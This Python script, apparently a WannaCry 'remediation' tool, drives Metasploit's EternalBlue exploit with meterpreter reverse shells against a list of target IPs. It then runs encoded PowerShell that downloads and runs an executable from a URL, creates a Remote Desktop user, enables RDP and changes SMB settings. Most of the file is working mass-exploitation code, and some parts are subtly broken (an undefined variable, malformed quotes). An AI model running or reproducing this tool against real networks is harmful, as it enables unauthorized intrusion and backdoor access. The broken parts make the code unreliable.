"""
Usage:
  wannacry_remediation.py --help
  wannacry_remediation.py [--smb1 --rdp] [(--clean --url=<url>)] [--logon=<message>] [(--username=<username> --password=<password>)] [(--remediate --rhosts=<rhosts> --lhost=<lhost> --lport=<lport>)]

Options:
  --help                    Show help screen
  --smb1                    Add disable SMBv1 to encoded powershell
  --rdp                     Add enable rdp to encoded powershell
  --clean                   Add download and run Microsoft malicious software removal tool during exploit to encoded powershell
  --url=<url>               URL for exploited infected systems to download Microsoft malicious software removal tool
  --username=<username>     Username of user created in encoded powershell
  --password=<password>     Password of user created in encoded powershell
  --logon=<message>         Add enable Windows logon message to encoded powershell
  --remediate               Run metasploit to execute encoded powershell against rhosts
  --rhosts=<rhosts>         Absolute file path for rhosts targets file
  --lhost=<lhost>           Host IP for the metasploit multi handler
  --lport=<lport>           Host port for the metasploit multi handler
"""
import logging
import os
import re
import sys
import json
import errno
import base64
import subprocess
import ipaddress
import datetime

from time import sleep
from docopt import docopt

working_dir = os.path.dirname(os.path.abspath(__file__)) + "/wcry_toolkit.log"
logging.basicConfig(
    format='%(asctime)s - %(levelname)s - %(message)s',
    level=logging.DEBUG,
    handlers=[
        logging.FileHandler(filename=working_dir, mode="w+"),
        logging.StreamHandler()
        ]
    )

def generate_cmd_string(cmd_options: dict) -> str:
    """
    Generate a string of desired commands.

    Args:
        cmd_options:    A dict from docopt containing all parsed command line arguments

    Returns:
        A string containing a concatenated group of powershell commands that are selected based on the parsed commandline arguments.
    """
    logging.info("Command line options used: \n{}".format(cmd_options))
    if cmd_options['--clean']:
        msrt_url = cmd_options['--url']
        powershell_cmds = "if(get-service \"mssecsvc2.0\"){{(new-object System.Net.WebClient).Downloadfile(\"{msrt_url}\", \"C:\\Users\\Removal.exe\");start-process -filepath \"C:\\Users\\Removal.exe\" -argumentlist \"/Q /F:Y\"}};".format(msrt_url=msrt_url)
    if cmd_options['--smb1']:
        powershell_cmds += "Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" SMB1 -Type DWORD -Value 0 -Force;"
    if cmd_options['--username']:
        username = cmd_options['--username']
        # Special characters may need to be escaped
        password = cmd_options['--password']
        # Password must meet windows requirements or add user will fail
        powershell_cmds += "net user {username} {password} /add;".format(username=username, password=password)
        powershell_cmds += "net localgroup \"Remote Desktop Users\" {username} /add;".format(username=username)
    if cmd_options['--rdp']:
        powershell_cmds += "reg add \“hklm\\system\\currentcontrolset\\control\\terminal server\” /f /v fDenyTSConnections /t REG_DWORD /d 0;"
    if cmd_options['--logon']:
        message = cmd_options['--logon']
        powershell_cmds += "Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"legalnoticecaption\" -Value \"{message}\";".format(message=message)
        powershell_cmds += "Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"legalnoticetext\" -Value \"{message}\";".format(message=message)
    logging.info(powershell_cmds)
    return powershell_cmds

def powershell_cmd_encode(powershell_cmds: str) -> str:
    """
    Encode desired powershell commands for use with powershell -encodedcommand argument.

    Args:
        powershell_cmds:    A string of powershell commands

    Returns:
        A string that represents an encoded string of powershell commands
    """
    logging.info("Entering powershell_cmd_encode")
    payload = str("{}".format(powershell_cmds))
    payload_encoded = base64.b64encode(payload.encode('UTF-16LE'))
    payload_encoded_str = payload_encoded.decode("utf-8")
    logging.info(payload_encoded_str)
    return payload_encoded_str

def write_cmds_file(powershell_cmds_encoded: str, filename: str = "execute.ps1") -> str:
    """
    Write the encoded commands out to a file in metasploit format.

    Args:
        powershell_cmds_encoded:    A string of encoded powershell commands

    Returns:
        A file path to a file that is written containing the encoded powershell commands, and used by the metasploit script
    """
    logging.info("Entering write_cmds_file")
    working_dir = os.path.dirname(os.path.abspath(__file__))
    ps_file_path = working_dir + "/" + filename
    with open(ps_file_path, 'w+') as file:
        file.write("powershell.exe -EncodedCommand " + powershell_cmds_encoded)
    logging.info(ps_file_path)
    return ps_file_path

def create_resource_file(rhosts: str, lhost: str, lport: str = "7775", filename: str = "host_iteration.rb") -> str:
    """
    Create the required metasploit resource file.

    Args:
        filename:   A name as a string for the metasploit resource file
        rhosts:     A location as a string for the rhosts file containing all target IPv4 addresses
        lhost:      The host IP address where the exploit handler is located
        lport:      The port where the exploit handler is located

    Returns:
        An absolute filepath as a string of the metasploit resource file generated
    """
    logging.info("Entering create_resource_file")
    working_dir = os.path.dirname(os.path.abspath(__file__))
    resource_file = working_dir + "/" + filename
    with open(resource_file, "w+") as file:
        content = """
use exploit/multi/handler
setg PAYLOAD windows/x64/meterpreter/reverse_tcp
setg LPORT {lport}
setg LHOST {lhost}
set ExitOnSession false
setg AutoRunScript post/windows/manage/powershell/exec_powershell SCRIPT="execute.ps1"
exploit -j
<ruby>

hostsfile='{rhosts}'
hosts=[]
File.open(hostsfile,"r") do |f|
f.each_line do |line|
hosts.push line.strip
end
end
hosts.each do |rhost|
	self.run_single("use exploit/windows/smb/ms17_010_eternalblue")
	self.run_single("set PAYLOAD windows/x64/meterpreter/reverse_tcp")
	self.run_single("set disablepayloadhandler true")
	self.run_single("set RHOST #{{rhost}}")
	self.run_single("exploit -j")
end

</ruby>
""".format(rhosts=rhosts, lhost=lhost, lport=lport)
        file.write(content)
    logging.info(resource_file)
    return resource_file

def confirm_rhosts_file(rhosts: str):
    """
    Confirm rhosts file exists.

    Args:
        rhosts: An absolute filepath as a string for the rhosts file containing the target IPv4 addresses

    Returns:
        N/A

    Raises:
        FileNotFoundError:  The rhosts file does not exist at the given absolute filepath
    """
    logging.info("Entering confirm_rhosts_file")
    logging.info("Checking for: {}".format(rhosts))
    if os.path.isfile(rhosts):
        logging.info("{} exists".format(rhosts))
    else:
        raise FileNotFoundError(errno.ENOENT, os.strerror(errno.ENOENT), rhosts)

def sanatize_rhosts(rhosts):
    """
    Return the absolute path of the created sanatized rhosts file which contains a set of valid ipv4 addresses.

    Args:
        rhosts: absolute file path to the original rhosts file passed into the tool

    Return:
        sanatized_rhosts: absolute file path for a file of valid ipv4 without duplicates
        last_target: the last ipv4 address in the file so we know when to kill msfconsole
    """
    logging.info("Entering sanatize_rhsots")
    ip_list = []
    target_count = 0
    with open(rhosts, 'r') as file:
        for ip in file:
            ipv4 = ip.strip("\n")
            try:
                ipaddress.ip_address(ipv4)
                logging.info("{} is a valid IPv4".format(ipv4))
                ip_list.append(ipv4)
                target_count += 1
            except ValueError:
                logging.info("{} is not a valid IP".format(ipv4))
                pass
    # remove duplicates in list and convert back to list
    sanatized_ip_list = list(set(ip_list))
    sanatized_rhosts = os.path.dirname(os.path.abspath(__file__)) + "/sanatized_rhosts"
    with open(sanatized_rhosts, "w+") as file:
        for i in set(sanatized_ip_list):
            logging.info("Writing {} to file {}".format(i, sanatized_rhosts))
            file.write(i + "\n")
    return sanatized_rhosts, target_count

def extract_ip(search_string: str):
    """
    Extract ipv4 from given input as string.
    Metasploit log lines may include the source IP therefore we check a few conditions on ip return count
    and make a decision on which index to return as our non source IP which will always be the last IP found

    Args:
        input:  String

    Returns:
        IPv4 address as str
    """
    ip_list = re.findall(r'[0-9]+(?:\.[0-9]+){3}', search_string)
    if len(ip_list) == 1:
        return ip_list[0]
    elif len(ip_list) == 2:
        return ip_list[1]
    elif len(ip_list) == 3:
        return ip_list[2]
    elif len(ip_list) == 4:
        return ip_list[3]
    elif len(ip_list) == 5:
        return ip_list[4]

def remediate(ps_file: str, msf_resource: str, target_count: int):
    """
    Attempt remediation using the generated encoded commands.

    Args:
        ps_file:        a powershell file containing the encoded powershell attack string in a syntax compatible with metasploit
        msf_resource:   resource file used for msfconsole
        last_target:    last ip address in the targets file

    Returns:
        attacked_results:   Dict of sets containing strings of ipv4 addresses
    """
    logging.info("Entering remediate")
    logging.info("Powershell file: {}".format(ps_file))
    logging.info("Metasploit resource file: {}".format(msf_resource))
    start_time = datetime.datetime.utcnow().strftime('%Y-%m-%d-%H:%M:%SZ')
    exploited = []
    failed = []
    msf_cmd = ["sudo", "msfconsole", "-r", msf_resource]
    logging.info("Running commands: {}".format(msf_cmd))
    proc = subprocess.Popen(msf_cmd, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    for line in proc.stdout:
        line_str = line.decode()
        attempted_count = len(list(set(exploited + failed)))
        if 'processing AutoRunScript' in line_str:
            logging.info(line_str)
            exploited_ip = extract_ip(line_str)
            if exploited_ip:
                exploited.append(exploited_ip)
                logging.info("AutoRunScript executed against: {}".format(exploited_ip))
        elif '[-]' in line_str:
            logging.info(line_str)
            failed_ip = extract_ip(line_str)
            if failed_ip:
                failed.append(failed_ip)
                logging.info("Failed to exploit: {}".format(failed_ip))
        elif attempted_count == target_count:
            logging.info("Completed all {} of {} attacks: exiting msfconsole".format(attempted_count,target_count))
            logging.info("Sleeping for 20 seconds to let remaining meterpreter conections take place")
            sleep(20)
            proc.kill()
            break
        else:
            logging.info(line_str)
    end_time = datetime.datetime.utcnow().strftime('%Y-%m-%d-%H:%M:%SZ')
    attacked_results = {"exploited": None, "exploit_failed": None, "start_time": start_time, "end_time": end_time}
    if exploited: 
        attacked_results['exploited'] = list(set(exploited))
    if failed:
        # remove anything that has reported successful exploit from failed list
        exploit_failed = [x for x in failed if x not in exploited]
        attacked_results['exploit_failed'] = list(set(exploit_failed))
    logging.info(attacked_results)
    abs_path = os.path.dirname(os.path.abspath(__file__))
    results_filename = abs_path + "/{}-results.json".format(start_time)
    with open(results_filename, 'w+') as file:
        file.write(json.dumps(attacked_results, indent=4, sort_keys=True))
    return attacked_results

def main():
    """
    Execute workflow.
    """
    try:
        cmd_options = docopt(__doc__)
        lhost = cmd_options['--lhost']
        lport = cmd_options['--lport']
        rhosts = cmd_options['--rhosts']
        powershell_cmds = generate_cmd_string(cmd_options)
        powershell_cmds_encoded = powershell_cmd_encode(powershell_cmds)
        ps_file_path = write_cmds_file(powershell_cmds_encoded)
        if cmd_options['--remediate']:
            try:
                confirm_rhosts_file(rhosts)
            except FileNotFoundError as ex:
                sys.exit(str(ex))
            sanatized_rhosts, target_count = sanatize_rhosts(rhosts)
            msf_resource_file = create_resource_file(
                lhost= lhost,
                lport= lport,
                rhosts=sanatized_rhosts)
            remediate(
                ps_file=ps_file_path,
                msf_resource=msf_resource_file,
                target_count=target_count
                )
    except Exception as ex:
        logging.debug("Exception thrown: {}".format(str(ex)))
        sys.exit()
if __name__ == '__main__':
    main()
